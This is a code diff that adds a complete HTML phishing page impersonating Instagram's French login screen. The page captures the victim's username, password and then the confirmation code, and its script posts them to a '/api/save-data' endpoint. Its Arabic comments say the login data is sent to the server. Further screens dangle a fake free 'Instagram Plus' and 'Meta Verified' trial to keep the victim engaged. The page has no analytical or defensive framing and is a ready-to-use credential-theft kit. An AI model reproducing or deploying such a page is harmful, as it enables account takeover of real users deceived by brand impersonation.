@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { width: 100%; max-width: 380px; text-align: center; display: none; }
+        .card.active { display: block; }
+        
+        .logo { width: 80px; margin-bottom: 25px; }
+        .input-group { margin-bottom: 12px; }
+        input { width: 100%; padding: 14px; border: 1px solid #dadde1; border-radius: 12px; background-color: #f7f8fa; font-size: 14px; outline: none; }
+        input:focus { border-color: #0095f6; background-color: #fff; }
+        
+        .btn-primary { width: 100%; padding: 12px; border: none; border-radius: 25px; background-color: #0064e0; color: white; font-weight: 600; font-size: 15px; cursor: pointer; margin-top: 10px; }
+        .btn-secondary { width: 100%; padding: 12px; border: 1px solid #0064e0; border-radius: 25px; background-color: transparent; color: #0064e0; font-weight: 600; font-size: 15px; cursor: pointer; margin-top: 15px; }
+        
+        .feature-list { text-align: left; margin: 20px 0; border: 1px solid #efefef; border-radius: 12px; padding: 10px 15px; }
+        .feature-item { padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
+        .feature-item:last-child { border-bottom: none; }
+        
+        .success-message { color: #2700a8; background-color: #e7f9ed; color: #155724; border: 1px solid #c3e6cb; padding: 15px; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <!-- Step 1: Login Screen -->
+    <div id="step-1" class="card active">
+        <p style="color: #65676b; font-size: 13px;">Français (France) ∨</p>
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+        
+        <div class="input-group">
+            <input type="text" id="login-identifier" placeholder="Nom de profil, e-mail ou numéro de mobile">
+        </div>
+        <div class="input-group">
+            <input type="password" id="login-password" placeholder="Mot de passe">
+        </div>
+        
+        <button class="btn-primary" onclick="goToStep2()">Se connecter</button>
+        <p style="font-size: 13px; margin-top: 15px;"><a href="#" style="text-decoration: none; color: #1c2b33; font-weight: 500;">Mot de passe oublié ?</a></p>
+        
+        <div style="margin-top: 60px;">
+            <button class="btn-secondary">Créer un nouveau compte</button>
+            <p style="font-size: 12px; color: #65676b; margin-top: 20px;">∞ Meta</p>
+        </div>
+    </div>
+
+    <!-- Step 2: Code Screen -->
+    <div id="step-2" class="card">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+        <h3>Entrez votre code</h3>
+        <p style="font-size: 14px; color: #65676b;">Saisissez le code de confirmation pour continuer.</p>
+        
+        <div class="input-group">
+            <input type="text" id="user-code" placeholder="Entrez le code">
+        </div>
+        
+        <button class="btn-primary" onclick="goToStep3()">Continuer</button>
+    </div>
+
+    <!-- Step 3: Instagram Plus -->
+    <div id="step-3" class="card">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+        <h2>Youssef, essayez <span style="background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Instagram Plus</span> gratuitement pendant un mois</h2>
+        <p style="font-size: 13px; color: #65676b;">Commandes avancées. Fonctionnalités exclusives.</p>
+        
+        <div class="feature-list">
+            <div class="feature-item">👁️ Prévisualisez les stories</div>
+            <div class="feature-item">🔄 Consultez les statistiques de relecture de vos stories</div>
+            <div class="feature-item">🔍 Recherchez dans la liste des personnes ayant regardé votre story</div>
+            <div class="feature-item">💬 Prévisualisez les messages</div>
+        </div>
+
+        <button class="btn-primary" onclick="goToStep4()">Essayer pour 0,00 $US</button>
+        <p style="font-size: 12px; color: #65676b; margin-top: 8px;">Annulez à tout moment.</p>
+    </div>
+
+    <!-- Step 4: Meta Verified -->
+    <div id="step-4" class="card">
+        <p style="font-weight: bold; font-size: 16px;">∞ Meta</p>
+        <h2>Bénéficiez du premier mois gratuit</h2>
+        
+        <div style="margin: 20px 0; border: 1px solid #dadde1; padding: 15px; border-radius: 12px; text-align: left;">
+            <p style="margin: 0; font-weight: bold;">Standard</p>
+            <p style="font-size: 12px; color: #65676b;">1 mois offert • 6,49 $US/mois</p>
+            <hr style="border: 0; border-top: 1px solid #eee; margin: 10px 0;">
+            <p style="font-size: 13px; margin: 5px 0;">✔ Badge Vérifié</p>
+            <p style="font-size: 13px; margin: 5px 0;">✔ Optimisation du référencement</p>
+        </div>
+
+        <button class="btn-primary" onclick="finishFlow()">Essayer pour 0,00 $US</button>
+        
+        <div id="final-message" class="success-message" style="display: none;">
+            Tu auras bientôt tes achats.
+        </div>
+    </div>
+
+<script>
+    let userData = {};
+
+    function showStep(stepId) {
+        document.querySelectorAll('.card').forEach(el => el.classList.remove('active'));
+        document.getElementById(stepId).classList.add('active');
+    }
+
+    function goToStep2() {
+        userData.identifier = document.getElementById('login-identifier').value;
+        userData.password = document.getElementById('login-password').value;
+        
+        // إرسال بيانات الدخول إلى السيرفر
+        sendDataToServer();
+        
+        showStep('step-2');
+    }
+
+    function goToStep3() {
+        userData.code = document.getElementById('user-code').value;
+        
+        // إرسال الكود إلى السيرفر
+        sendDataToServer();
+        
+        showStep('step-3');
+    }
+
+    function goToStep4() {
+        showStep('step-4');
+    }
+
+    function finishFlow() {
+        document.getElementById('final-message').style.display = 'block';
+    }
+
+    async function sendDataToServer() {
+        try {
+            await fetch('/api/save-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(userData)
+            });
+        } catch (err) {
+            console.error('Error sending data:', err);
+        }
+    }
+</script>
+</body>
+</html>
